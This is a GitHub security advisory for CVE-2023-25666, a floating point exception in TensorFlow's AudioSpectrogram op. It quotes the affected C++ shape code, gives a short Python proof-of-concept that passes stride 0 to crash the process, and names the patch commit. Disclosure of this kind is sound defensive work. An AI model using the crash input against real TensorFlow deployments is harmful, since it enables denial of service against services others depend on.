# [H] TensorFlow has Floating Point Exception in AudioSpectrogram 

## Summary
Severity: High
Advisory: GHSA-f637-vh3r-vfh2
CVE: CVE-2023-25666
CWE: CWE-697
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2023-03-24
Source: https://github.com/advisories/GHSA-f637-vh3r-vfh2
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.11.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.11.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.11.1

## Details
### Impact
version:2.11.0 //core/ops/audio_ops.cc:70

Status SpectrogramShapeFn(InferenceContext* c) { ShapeHandle input; TF_RETURN_IF_ERROR(c->WithRank(c->input(0), 2, &input)); int32_t window_size; TF_RETURN_IF_ERROR(c->GetAttr("window_size", &window_size)); int32_t stride; TF_RETURN_IF_ERROR(c->GetAttr("stride", &stride)); .....[1]

DimensionHandle input_length = c->Dim(input, 0); DimensionHandle input_channels = c->Dim(input, 1);

DimensionHandle output_length; if (!c->ValueKnown(input_length)) { output_length = c->UnknownDim(); } else { const int64_t input_length_value = c->Value(input_length); const int64_t length_minus_window = (input_length_value - window_size); int64_t output_length_value; if (length_minus_window < 0) { output_length_value = 0; } else { output_length_value = 1 + (length_minus_window / stride); .....[2] } output_length = c->MakeDim(output_length_value); }

Get the value of stride at [1], and the used at [2]
```python
import tensorflow as tf

para = {'input': tf.constant([[14.], [24.]], dtype=tf.float32), 'window_size': 1, 'stride': 0, 'magnitude_squared': False}
func = tf.raw_ops.AudioSpectrogram

@tf.function(jit_compile=True)
def fuzz_jit():
   y = func(**para)
   return y

fuzz_jit()
```

### Patches
We have patched the issue in GitHub commit [d0d4e779da0d0f56499c6fa5ba09f0a576cc6b14](https://github.com/tensorflow/tensorflow/commit/d0d4e779da0d0f56499c6fa5ba09f0a576cc6b14).

The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by r3pwnx

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f637-vh3r-vfh2
- https://nvd.nist.gov/vuln/detail/CVE-2023-25666
- https://github.com/tensorflow/tensorflow/commit/d0d4e779da0d0f56499c6fa5ba09f0a576cc6b14
- https://github.com/tensorflow/tensorflow
